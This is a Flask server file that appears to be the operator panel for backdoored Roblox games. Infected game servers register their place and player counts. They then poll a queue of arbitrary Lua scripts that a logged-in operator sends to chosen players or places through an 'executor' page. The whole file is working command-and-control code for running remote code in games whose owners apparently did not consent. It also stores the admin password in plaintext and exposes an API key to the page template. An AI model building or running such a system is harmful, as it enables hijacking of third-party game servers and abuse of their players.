# app.py
import json
import os
import secrets
import time
import requests
from functools import wraps

from flask import (
    Flask, jsonify, redirect, render_template, request, session, url_for,
)
from supabase import create_client, Client

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET_KEY")
if not app.secret_key: raise ValueError("FLASK_SECRET_KEY missing!")

REPORT_KEY = os.environ.get("REPORT_KEY")
LOGGER_KEY = os.environ.get("LOGGER_KEY")
LUA_EXEC_KEY = os.environ.get("LUA_EXEC_KEY")
ADMIN_USERNAME = os.environ.get("ADMIN_USERNAME", "admin")

if not all([REPORT_KEY, LOGGER_KEY, LUA_EXEC_KEY]):
    raise ValueError("Environment variables missing!")

LUA_KEYS = {LUA_EXEC_KEY}

app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_SAMESITE="Lax",
    MAX_CONTENT_LENGTH=256 * 1024,
)

LUA_SEND_PER_MIN = 600
LUA_DRAIN_PER_MIN = 1200
LUA_DRAIN_COOLDOWN = 2.0
LUA_OVERLOAD_WINDOW = 30.0
LUA_SEND_COOLDOWN = 0.5

_last_send = {}
_last_drain = {}
_overloaded = {}
failed_logins = {}
_lua_buckets = {}

SUPABASE_URL = os.environ.get("SUPABASE_URL")
SUPABASE_KEY = os.environ.get("SUPABASE_KEY")
if not SUPABASE_URL or not SUPABASE_KEY: raise ValueError("Supabase keys missing!")

supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

def get_universe_id(place_id):
    try:
        r = requests.get(f"https://apis.roblox.com/universes/v1/places/{place_id}/universe", timeout=3)
        if r.status_code == 200: return r.json().get("universeId")
    except: pass
    return None

def _rate_ok(ip, bucket_name, limit):
    now = time.time()
    key = (ip, bucket_name)
    hits = [t for t in _lua_buckets.get(key, []) if now - t < 60]
    if len(hits) >= limit:
        _lua_buckets[key] = hits
        return False
    hits.append(now)
    _lua_buckets[key] = hits
    return True

def _cooldown_send(ip):
    if LUA_SEND_COOLDOWN <= 0: return True, 0.0
    now = time.time()
    last = _last_send.get(ip)
    if last is None or now - last >= LUA_SEND_COOLDOWN:
        _last_send[ip] = now
        return True, 0.0
    return False, LUA_SEND_COOLDOWN - (now - last)

def _cooldown_drain(place_id, job_id):
    if LUA_DRAIN_COOLDOWN <= 0: return True, 0.0
    key = (int(place_id), str(job_id))
    now = time.time()
    last = _last_drain.get(key)
    if last is None or now - last >= LUA_DRAIN_COOLDOWN:
        _last_drain[key] = now
        return True, 0.0
    return False, LUA_DRAIN_COOLDOWN - (now - last)

def _mark_overloaded(place_id, job_id):
    _overloaded[(int(place_id), str(job_id))] = time.time()

def _is_overloaded(place_id, job_id):
    key = (int(place_id), str(job_id))
    t = _overloaded.get(key)
    if t is None: return False, 0.0
    elapsed = time.time() - t
    if elapsed >= LUA_OVERLOAD_WINDOW:
        _overloaded.pop(key, None)
        return False, 0.0
    return True, LUA_OVERLOAD_WINDOW - elapsed

def _client_identity():
    data = request.get_json(silent=True)
    if isinstance(data, dict):
        pid = data.get("place_id")
        jid = data.get("job_id")
        try:
            return (int(pid) if pid is not None else None, str(jid) if jid is not None else None)
        except:
            return None, None
    return None, None

def csrf_token():
    token = session.get("csrf_token")
    if not token:
        token = secrets.token_urlsafe(32)
        session["csrf_token"] = token
    return token

def valid_csrf():
    supplied = request.form.get("csrf_token") or request.headers.get("X-CSRF-Token")
    expected = session.get("csrf_token")
    return bool(supplied and expected and secrets.compare_digest(supplied, expected))

def login_required(view):
    @wraps(view)
    def wrapped(*args, **kwargs):
        if not session.get("logged_in"):
            return redirect(url_for("login", next=request.path))
        return view(*args, **kwargs)
    return wrapped

def check_report_key():
    supplied = request.headers.get("X-GameReporter-Key", "").strip()
    if not supplied or not REPORT_KEY: return False
    return secrets.compare_digest(supplied, REPORT_KEY)

def _body_key():
    data = request.get_json(silent=True)
    if isinstance(data, dict): return str(data.get("key", "")).strip()
    return request.form.get("key", "").strip()

def _key_matches(candidate, accepted):
    if not candidate: return False
    for k in accepted:
        if k and secrets.compare_digest(candidate, k): return True
    return False

def api_key_required(view):
    @wraps(view)
    def wrapped(*args, **kwargs):
        if not check_report_key():
            return jsonify({"success": False, "error": "Invalid API key"}), 401
        return view(*args, **kwargs)
    return wrapped

def lua_key_required(view):
    @wraps(view)
    def wrapped(*args, **kwargs):
        header_key = request.headers.get("X-GameReporter-Key", "").strip()
        candidate = header_key or _body_key()
        accepted = {REPORT_KEY, *LUA_KEYS}
        if not _key_matches(candidate, accepted):
            return jsonify({"success": False, "error": "Invalid key"}), 403
        return view(*args, **kwargs)
    return wrapped

@app.after_request
def security_headers(response):
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["Referrer-Policy"] = "same-origin"
    response.headers["Cache-Control"] = "no-store"
    return response

@app.context_processor
def inject_global_vars():
    token = csrf_token()
    return dict(csrf=token, csrf_token=token)

# ============================================================
# DYNAMIC LOGIN ROUTE
# ============================================================

@app.route("/login", methods=["GET", "POST"])
def login():
    if session.get("logged_in"): return redirect(url_for("games_page"))
    ip = request.remote_addr or "unknown"
    now = time.time()
    attempts = [t for t in failed_logins.get(ip, []) if now - t < 900]
    failed_logins[ip] = attempts
    error = None
    
    if request.method == "POST":
        if len(attempts) >= 5: 
            error = "Too many failed attempts."
        elif not valid_csrf(): 
            error = "Invalid security token."
        else:
            user = request.form.get("username", "").strip()
            password = request.form.get("password", "").strip()
            
            if not user or not password:
                error = "Please enter both username and password."
            elif user != ADMIN_USERNAME:
                error = "Invalid username or password."
            else:
                try:
                    res = supabase.table("settings").select("value").eq("key", "password").execute()
                    if res.data and res.data[0]["value"] == password:
                        failed_logins.pop(ip, None)
                        session.clear()
                        session["logged_in"] = True
                        session["csrf_token"] = secrets.token_urlsafe(32)
                        return redirect(url_for("games_page"))
                    else:
                        error = "Invalid username or password."
                except Exception as e:
                    error = "Database error."
                    print("Login DB Error:", e)
            
            attempts.append(now)
            failed_logins[ip] = attempts

    return render_template("login.html", error=error)

@app.post("/logout")
@login_required
def logout():
    session.clear()
    return redirect(url_for("login"))

@app.route("/")
@login_required
def dashboard(): return redirect(url_for("games_page"))

@app.route("/games")
@login_required
def games_page():
    games_list = []
    try:
        res = supabase.table("game_logs").select("*").order("last_updated", desc=True).limit(50).execute()
        now = time.time()
        for game in res.data:
            if now - float(game.get("last_updated", 0)) > 300: continue
            game["online"] = (now - float(game.get("last_updated", 0)) <= 120)
            games_list.append(game)
    except Exception as e:
        print("DB Error:", e)
            
    return render_template("games.html", games=games_list, active_page="games")

@app.route("/scripts")
@login_required
def scripts_page(): return render_template("scripts.html", active_page="scripts")

@app.route("/executor")
@login_required
def executor_page():
    session["report_key"] = REPORT_KEY
    return render_template("executor.html", active_page="executor", report_key=REPORT_KEY)

@app.post("/api/execute_player")
@login_required
def execute_player():
    data = request.get_json(silent=True) or {}
    username = data.get("username", "").strip()

    if not username:
        return jsonify({"success": False, "error": "Username required"})

    try:
        r = requests.post("https://users.roblox.com/v1/usernames/users", json={"usernames": [username], "excludeBannedUsers": True}, timeout=5)
        r_data = r.json()
        if not r_data.get("data"):
            return jsonify({"success": False, "error": "User not found"})

        user = r_data["data"][0]
        uid = user["id"]
        exact_name = user["name"]

        session["target_user_id"] = uid
        session["target_name"] = exact_name
        session.pop("target_place_id", None)

        return jsonify({"success": True, "name": exact_name, "uid": uid})
    except Exception:
        return jsonify({"success": False, "error": "Roblox API timeout"})

@app.post("/api/set_place")
@login_required
def set_place():
    data = request.get_json(silent=True) or {}
    place_id = data.get("place_id", "").strip()
    if not place_id: return jsonify({"success": False, "error": "Place ID required"})
    session["target_place_id"] = int(place_id)
    session.pop("target_user_id", None)
    session.pop("target_name", None)
    return jsonify({"success": True, "type": "place", "place_id": place_id})

@app.post("/api/clear_target")
@login_required
def clear_target():
    session.pop("target_user_id", None)
    session.pop("target_name", None)
    session.pop("target_place_id", None)
    return jsonify({"success": True})

@app.route('/api/lua/flush', methods=['POST'])
def flush_queues():
    data = request.json
    if not data or data.get('key') != REPORT_KEY and data.get('key') not in LUA_KEYS:
        return jsonify({"success": False, "error": "Unauthorized"}), 401

    supabase.table("lua_messages").delete().neq("id", 0).execute()
    return jsonify({"success": True, "message": "All queues flushed."})

@app.route('/api/queues/flush', methods=['POST'])
@login_required
def flush_queues_dashboard():
    supabase.table("lua_messages").delete().neq("id", 0).execute()
    return jsonify({"success": True, "message": "All queued scripts cleared."})

@app.post("/api/lua/send")
@lua_key_required
def lua_send():
    ip = request.remote_addr or "unknown"
    if not _rate_ok(ip, "send", LUA_SEND_PER_MIN): return jsonify({"success": False, "error": "rate limit"}), 429
    ok, wait = _cooldown_send(ip)
    if not ok: return jsonify({"success": False, "error": "cooldown", "retry_after": round(wait, 2)}), 429

    data = request.get_json(silent=True) or {}
    text = str(data.get("text", "")).strip()

    target_user_id = session.get("target_user_id")
    target_place_id = session.get("target_place_id")

    req_place_id = data.get("target_place_id")
    if req_place_id: target_place_id = int(req_place_id)

    if not text and not target_user_id:
        return jsonify({"success": False, "error": "text required"}), 400

    label = str(data.get("label", "")).strip() or None

    res = supabase.table("lua_messages").insert({
        "message_key": label,
        "text": text,
        "target_user_id": target_user_id,
        "target_place_id": target_place_id
    }).execute()
    
    if res.data:
        return jsonify({"success": True, "id": res.data[0]["id"]})
    
    return jsonify({"success": False, "error": "DB Error"}), 500

@app.post("/api/lua/drain")
@lua_key_required
def lua_drain():
    ip = request.remote_addr or "unknown"
    if not _rate_ok(ip, "drain", LUA_DRAIN_PER_MIN): return jsonify({"success": False, "error": "rate limit"}), 429

    place_id, job_id = _client_identity()
    if place_id is not None and job_id is not None:
        over, over_wait = _is_overloaded(place_id, job_id)
        if over: return jsonify({"success": False, "error": "overloaded", "retry_after": round(over_wait, 2)}), 429
        ok, wait = _cooldown_drain(place_id, job_id)
        if not ok: return jsonify({"success": False, "error": "cooldown", "retry_after": round(wait, 2)}), 429

    res = supabase.table("lua_messages").select("*").or_(f"target_place_id.is.null,target_place_id.eq.{place_id}").order("id").limit(1).execute()
    
    if not res.data:
        return jsonify({"success": True, "text": None, "target_user_id": None})
        
    row = res.data[0]
    supabase.table("lua_messages").delete().eq("id", row["id"]).execute()
    
    return jsonify({
        "success": True, "id": row["id"], "text": row["text"],
        "target_user_id": row["target_user_id"]
    })

@app.post("/api/update")
@api_key_required
def update_server():
    data = request.get_json(silent=True)
    if not isinstance(data, dict): return jsonify({"success": False, "error": "Invalid JSON"}), 400
    try:
        place_id = int(data.get("place_id", 0)); job_id = str(data.get("job_id", "")).strip()
        players = int(data.get("players", 0)); closing = bool(data.get("closing", False))
        overloaded = bool(data.get("overloaded", False))
    except: return jsonify({"success": False, "error": "Invalid types"}), 400

    if overloaded: _mark_overloaded(place_id, job_id)
    
    if closing:
        supabase.table("servers").delete().eq("place_id", place_id).eq("job_id", job_id).execute()
        return jsonify({"success": True, "action": "removed"})

    supabase.table("servers").upsert({
        "place_id": place_id,
        "job_id": job_id,
        "players": players,
        "updated": time.time()
    }).execute()
        
    return jsonify({"success": True, "action": "updated"})

@app.post("/api/log")
def log_game():
    supplied = request.headers.get("X-GameReporter-Key", "").strip()
    if not supplied or not secrets.compare_digest(supplied, LOGGER_KEY):
        return jsonify({"success": False, "error": "Forbidden"}), 403

    data = request.get_json(silent=True) or request.form
    place_id = str(data.get("place_id", "0")).strip()
    name = str(data.get("name", "Unknown")).strip()

    if not name: return jsonify({"success": False, "error": "name required"}), 400

    existing_res = supabase.table("game_logs").select("*").eq("place_id", place_id).execute()
    existing = existing_res.data[0] if existing_res.data else {}

    creator = data.get("creator", existing.get("creator", "Unknown"))
    icon_url = data.get("icon_url", existing.get("icon_url", ""))
    created = data.get("created", existing.get("created", ""))
    visits = int(data.get("visits", existing.get("visits", 0)))
    favorited = int(data.get("favorited", existing.get("favorited", 0)))

    if (name == "Unknown" or icon_url == "") and place_id != "0":
        universe_id = get_universe_id(place_id)
        if universe_id:
            try:
                r = requests.get(f"https://thumbnails.roblox.com/v1/games/icons?universeIds={universe_id}&size=512x512&format=Png", timeout=3)
                if r.status_code == 200:
                    i_data = r.json().get("data", [])
                    if i_data: icon_url = i_data[0].get("imageUrl", "")

                r_game = requests.get(f"https://games.roblox.com/v1/games?universeIds={universe_id}", timeout=3)
                if r_game.status_code == 200:
                    g_data = r_game.json().get("data", [])
                    if g_data:
                        name = g_data[0].get("name", name)
                        creator = g_data[0].get("creator", {}).get("name", creator)
                        created = g_data[0].get("created", created)[:10]
                        visits = g_data[0].get("visits", visits)
                        favorited = g_data[0].get("favoritedCount", favorited)
            except: pass

    supabase.table("game_logs").upsert({
        "place_id": place_id,
        "name": name,
        "creator": creator,
        "created": created,
        "visits": visits,
        "favorited": favorited,
        "players": max(0, int(data.get("players", 0))),
        "icon_url": icon_url,
        "join_link": f"https://www.roblox.com/games/{place_id}",
        "last_updated": time.time()
    }).execute()

    return jsonify({"success": True, "place_id": place_id})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
